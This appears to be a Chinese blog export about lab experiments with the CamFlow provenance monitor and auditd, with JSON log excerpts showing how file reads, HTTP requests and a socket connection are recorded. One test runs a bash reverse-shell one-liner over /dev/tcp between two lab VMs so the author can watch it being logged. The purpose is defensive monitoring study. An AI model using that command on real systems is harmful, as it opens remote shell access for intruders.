&quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 1000, &quot;cf:gid&quot;: 1000, &quot;cf:mode&quot;: &quot;0x81b4&quot;, &quot;cf:secctx&quot;: &quot;unconfined_u:object_r:user_home_t:s0&quot;, &quot;cf:ino&quot;: 1689, &quot;cf:uuid&quot;: &quot;90365732-09d3-477e-bf09-6e627d11b666&quot;, &quot;prov:label&quot;: &quot;[file] 0&quot; &#125;, &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;140630&quot;, &quot;prov:type&quot;: &quot;process_memory&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 1000, &quot;cf:gid&quot;: 1000, &quot;cf:tgid&quot;: 2303, &quot;cf:utsns&quot;: 4026531838, &quot;cf:ipcns&quot;: 4026531839, &quot;cf:mntns&quot;: 4026531840, &quot;cf:pidns&quot;: 4026531836, &quot;cf:netns&quot;: 4026531992, &quot;cf:cgroupns&quot;: 4026531835, &quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;, &quot;prov:label&quot;: &quot;[process] 0&quot; &#125;, &quot;cf:AABAAAAAACTdRIrNKHN5qxcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;12356033671751943389&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;cat&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;cat&quot; &#125;, &quot;cf:AABAAAAAACQ+0Ymi&#x2F;VZO3hcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;16018836571957088574&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;home&#x2F;supervampire&#x2F;fflag&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;home&#x2F;supervampire&#x2F;fflag&quot; &#125;, &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;140630&quot;, &quot;prov:type&quot;: &quot;process_memory&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 1, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294818180&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 1000, &quot;cf:gid&quot;: 1000, &quot;cf:tgid&quot;: 2303, &quot;cf:utsns&quot;: 4026531838, &quot;cf:ipcns&quot;: 4026531839, &quot;cf:mntns&quot;: 4026531840, &quot;cf:pidns&quot;: 4026531836, &quot;cf:netns&quot;: 4026531992, &quot;cf:cgroupns&quot;: 4026531835, &quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;, &quot;prov:label&quot;: &quot;[process] 1&quot; &#125; &#125;, &quot;used&quot;: &#123; &quot;cf:gAAAAAAAIIABAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;1&quot;, &quot;prov:type&quot;: &quot;open&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;open&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140629&quot; &#125;, &quot;cf:AAgAAAAAIIAHAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;7&quot;, &quot;prov:type&quot;: &quot;getattr&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;getattr&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140629&quot; &#125;, &quot;cf:AQAAAAAAIIAKAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;10&quot;, &quot;prov:type&quot;: &quot;read&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;read&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBMSQIAAAAAABQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAgAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;4&quot;, &quot;cf:task_id&quot;: &quot;140629&quot; &#125; &#125;, &quot;wasGeneratedBy&quot;: &#123; &quot;cf:gAAAAAAAQIADAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;3&quot;, &quot;prov:type&quot;: &quot;memory_write&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;memory_write&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140629&quot; &#125;, &quot;cf:gAAAAAAAQIAIAAAAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;8&quot;, &quot;prov:type&quot;: &quot;memory_write&quot;, &quot;cf:boot_id&quot;: 23, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T02:03:30&quot;, &quot;cf:jiffies&quot;: &quot;4294818170&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;memory_write&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEBVJQIAAAAAABcAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:AAAIAAAAACBWJQIAAAAAABcAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140629&quot; &#125; &#125;,&#125;##prov:type:顶点和边的属性(类型)cf:machine_id machine唯一标识符cf:boot_id 每个machine下唯一boot标识符cf:id 每个machine或boot下唯一顶点&#x2F;边的标识符cf:date 捕获时间cf:jiffies 在内核中捕获的jiffies(jiffies是记录着从电脑开机到现在总共的时钟中断次数)cf:offset 文件对象的偏移量cf:version 对象的版本(版本对应对象的状态)cf:uid user IDcf:gid group IDcf:pid 进程标识符cf:vpid 虚拟进程标识符cf:secctx 由SElinux定义的安全上下文cf:mode 索引节点模式cf:ino 索引号cf:uuid superblock唯一标识符cf:length path&#x2F;value&#x2F;name&#x2F;content属性的大小cf:atime 访问时间cf:ctime 改变时间cf:mtime 修改时间cf:truncated value&#x2F;name&#x2F;content是否被截断cf:content IP数据包内容值cf:seq IP序号cf:sender 数据包发送方ip地址cf:receiver 数据包接收方ip地址cf:address ip地址cf:pathname 路径名cf:value 环境&#x2F;参数变量值 查看顶点属性列表，查看边属性列表 其中file,process_memory,path为顶点属性，used,WasGeneratedBy为边属性，分析日志可得，顶点属性path中包含/usr/bin/cat和/home/supervampire/fflag等，边属性中used包含open,getattr,read等，可知使用cat /home/supervampire/fflag对fflag文件进行打开、读等操作； 其中可以将日志导入官方提供的 可视化平台链接 (日志格式需要为w3c，默认为spade_json，可以在/etc/camflowd.ini中修改)，可视化效果如下(边属性因为图片大小没有清楚显示出来)： 监控网络添加规则用于追踪ipv4入口： 12sudo camflow --track-ipv4-ingress 0.0.0.0&#x2F;0:5000#跟踪0.0.0.0:5000入口 现在fedora机器上python启动http服务，打开另一台虚拟机(ip为192.168.183.128)执行curl命令访问fedora机器上的web服务： 1curl http:&#x2F;&#x2F;192.168.183.130:5000 根据ip关键字定位到日志位置：(日志由于太长只截取以下关键部分，完整日志点击链接，同时对日志内容进行了json格式化操作，方便阅读) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156&#123; &quot;entity&quot;: &#123; &quot;cf:AABAAAAAACThul9E+DhrUCAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;5794787984492444385&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;python3.9&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;python3.9&quot; &#125;, &quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;136129&quot;, &quot;prov:type&quot;: &quot;process_memory&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 0, &quot;cf:gid&quot;: 0, &quot;cf:tgid&quot;: 2209, &quot;cf:utsns&quot;: 4026531838, &quot;cf:ipcns&quot;: 4026531839, &quot;cf:mntns&quot;: 4026531840, &quot;cf:pidns&quot;: 4026531836, &quot;cf:netns&quot;: 4026531992, &quot;cf:cgroupns&quot;: 4026531835, &quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;, &quot;prov:label&quot;: &quot;[process] 0&quot; &#125;, &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;136972&quot;, &quot;prov:type&quot;: &quot;socket&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 0, &quot;cf:gid&quot;: 0, &quot;cf:mode&quot;: &quot;0xc1ff&quot;, &quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;, &quot;cf:ino&quot;: 54378, &quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;, &quot;prov:label&quot;: &quot;[socket] 0&quot; &#125;, &quot;cf:AAACAAAAACA1TQAAwKi3gsCot4ATiMqMBgAAAP1WwoA&#x3D;&quot;: &#123; &quot;cf:id&quot;: 19765, &quot;cf:seq&quot;: 2160219901, &quot;cf:sender&quot;: &quot;192.168.183.130:5000&quot;, &quot;cf:receiver&quot;: &quot;192.168.183.128:51852&quot;, &quot;prov:type&quot;: &quot;packet&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:len&quot;: 52992, &quot;prov:label&quot;: &quot;[packet] 192.168.183.130:5000-&gt;192.168.183.128:51852 (19765)&quot; &#125;, &quot;cf:AAACAAAAACA1TgAAwKi3gsCot4ATiMqMBgAAAP1Wwxs&#x3D;&quot;: &#123; &quot;cf:id&quot;: 20021, &quot;cf:seq&quot;: 465786621, &quot;cf:sender&quot;: &quot;192.168.183.130:5000&quot;, &quot;cf:receiver&quot;: &quot;192.168.183.128:51852&quot;, &quot;prov:type&quot;: &quot;packet&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:len&quot;: 26885, &quot;prov:label&quot;: &quot;[packet] 192.168.183.130:5000-&gt;192.168.183.128:51852 (20021)&quot; &#125;, &#125;, &quot;wasDerivedFrom&quot;: &#123; &quot;cf:AQAAAAAAgIAEAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;4&quot;, &quot;prov:type&quot;: &quot;named&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;named&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:AABAAAAAACThul9E+DhrUCAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;136973&quot; &#125;, &quot;cf:AAABAAAAgIAIAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;8&quot;, &quot;prov:type&quot;: &quot;sh_read&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;sh_read&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:AAEAAAAAACB&#x2F;0gAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDBEwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;80000d1&quot;, &quot;cf:task_id&quot;: &quot;136973&quot; &#125;, &quot;cf:BAAAAAAAgIAMAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;12&quot;, &quot;prov:type&quot;: &quot;send_packet&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;send_packet&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACA1TQAAwKi3gsCot4ATiMqMBgAAAP1WwoA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;136973&quot; &#125;, &quot;cf:BAAAAAAAgIANAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;13&quot;, &quot;prov:type&quot;: &quot;send_packet&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;send_packet&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACA1TgAAwKi3gsCot4ATiMqMBgAAAP1Wwxs&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;136973&quot; &#125;, &quot;cf:QAAAAAAAgIAOAAAAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;14&quot;, &quot;prov:type&quot;: &quot;free&quot;, &quot;cf:boot_id&quot;: 32, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T06:04:28&quot;, &quot;cf:jiffies&quot;: &quot;4294700806&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;free&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:ACAAAAAAACAMFwIAAAAAACAAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;136973&quot; &#125;, &#125;&#125; 分析以上日志内容，顶点属性包括packet，path，socket等，边属性包括send-packet，free等，记录了网络行为，可视化结果如下： 监控进程添加规则用于监控进程： 12sudo camflow --track-process 2311 true#跟踪进程2311(该进程为ncat监听本地6767端口) 用另一台虚拟机(ip为192.168.183.128)执行反弹shell命令， 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.183.130&#x2F;6767 0&gt;&amp;1 根据ncat关键字定位到日志位置：(日志由于太长只截取以下关键部分，完整日志点击链接，同时对日志内容进行了json格式化操作，方便阅读): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106&#123; &quot;entity&quot;: &#123; &quot;cf:AABAAAAAACQr79h+QtinGiQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;1920741546204393259&quot;, &quot;prov:type&quot;: &quot;path&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294872563&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:pathname&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;ncat&quot;, &quot;prov:label&quot;: &quot;[path] &#x2F;usr&#x2F;bin&#x2F;ncat&quot; &#125;, &quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;142293&quot;, &quot;prov:type&quot;: &quot;socket&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294872563&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 0, &quot;cf:gid&quot;: 0, &quot;cf:mode&quot;: &quot;0xc1ff&quot;, &quot;cf:secctx&quot;: &quot;system_u:object_r:unlabeled_t:s0&quot;, &quot;cf:ino&quot;: 56809, &quot;cf:uuid&quot;: &quot;00000000-0000-0000-0000-000000000000&quot;, &quot;prov:label&quot;: &quot;[socket] 0&quot; &#125;, &quot;cf:AAAIAAAAACDlHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;138981&quot;, &quot;prov:type&quot;: &quot;process_memory&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:version&quot;: 0, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:taint&quot;: &quot;0&quot;, &quot;cf:jiffies&quot;: &quot;4294872563&quot;, &quot;cf:epoch&quot;: 2, &quot;cf:uid&quot;: 1000, &quot;cf:gid&quot;: 1000, &quot;cf:tgid&quot;: 2311, &quot;cf:utsns&quot;: 4026531838, &quot;cf:ipcns&quot;: 4026531839, &quot;cf:mntns&quot;: 4026531840, &quot;cf:pidns&quot;: 4026531836, &quot;cf:netns&quot;: 4026531992, &quot;cf:cgroupns&quot;: 4026531835, &quot;cf:secctx&quot;: &quot;unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023&quot;, &quot;prov:label&quot;: &quot;[process] 0&quot; &#125; &#125;, &quot;used&quot;: &#123; &quot;cf:CAAAAAAAIIABAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;1&quot;, &quot;prov:type&quot;: &quot;accept&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:jiffies&quot;: &quot;4294872563&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;accept&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEDkHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;138980&quot; &#125;, &quot;cf:IAAAAAAAIIAGAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;6&quot;, &quot;prov:type&quot;: &quot;receive_msg&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:jiffies&quot;: &quot;4294872689&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;receive_msg&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACDVKwIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEDkHgIAAAAAACQAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;40&quot;, &quot;cf:task_id&quot;: &quot;138980&quot; &#125; &#125;, &quot;wasDerivedFrom&quot;: &#123; &quot;cf:AQAAAAAAgIAEAAAAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;4&quot;, &quot;prov:type&quot;: &quot;named&quot;, &quot;cf:boot_id&quot;: 36, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:01T07:17:59&quot;, &quot;cf:jiffies&quot;: &quot;4294872563&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;named&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:AABAAAAAACQr79h+QtinGiQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACDlHgIAAAAAACQAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;138980&quot; &#125; &#125;&#125; 分析以上日志，顶点属性有socket，process_memory，path等，边属性有receive_msg，accept(socket accept)等，说明两个虚拟机之间建立了socket通信，可视化结果如下：","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"系统监控","slug":"系统监控","permalink":"https://wxt406611016.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/"}]},{"title":"audit+camflow实验","slug":"audit+camflow实验","date":"2021-01-31T16:00:00.000Z","updated":"2021-03-05T14:57:44.756Z","comments":true,"path":"2021/02/01/audit+camflow实验/","link":"","permalink":"https://wxt406611016.github.io/2021/02/01/audit+camflow%E5%AE%9E%E9%AA%8C/","excerpt":"Auditd测试 测试目标：拷贝，压缩 测试环境：C，Python，命令行，图形界面 测试脚本源码地址链接","text":"Auditd测试 测试目标：拷贝，压缩 测试环境：C，Python，命令行，图形界面 测试脚本源码地址链接 C拷贝： 添加规则：sudo auditctl -w /home/supervampire/桌面/C/a.txt -p rwxa -F key=ccopy 拷贝命令：./copy a.txt aa.txt 查看日志：sudo ausearch -i -k ccopy1234type&#x3D;PROCTITLE msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : proctitle&#x3D;.&#x2F;copy a.txt aa.txt type&#x3D;PATH msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : item&#x3D;0 name&#x3D;a.txt inode&#x3D;394627 dev&#x3D;08:05 mode&#x3D;file,664 ouid&#x3D;supervampire ogid&#x3D;supervampire rdev&#x3D;00:00 nametype&#x3D;NORMAL cap_fp&#x3D;none cap_fi&#x3D;none cap_fe&#x3D;0 cap_fver&#x3D;0 cap_frootid&#x3D;0 type&#x3D;CWD msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : cwd&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C type&#x3D;SYSCALL msg&#x3D;audit(2021年02月02日 10:09:43.146:250) : arch&#x3D;x86_64 syscall&#x3D;openat success&#x3D;yes exit&#x3D;3 a0&#x3D;0xffffff9c a1&#x3D;0x7fffe995621a a2&#x3D;O_RDWR a3&#x3D;0x0 items&#x3D;1 ppid&#x3D;3983 pid&#x3D;4117 auid&#x3D;supervampire uid&#x3D;supervampire gid&#x3D;supervampire euid&#x3D;supervampire suid&#x3D;supervampire fsuid&#x3D;supervampire egid&#x3D;supervampire sgid&#x3D;supervampire fsgid&#x3D;supervampire tty&#x3D;pts0 ses&#x3D;3 comm&#x3D;copy exe&#x3D;&#x2F;home&#x2F;supervampire&#x2F;桌面&#x2F;C&#x2F;copy subj&#x3D;unconfined key&#x3D;ccopy *压缩：** 添加规则：sudo auditctl -w 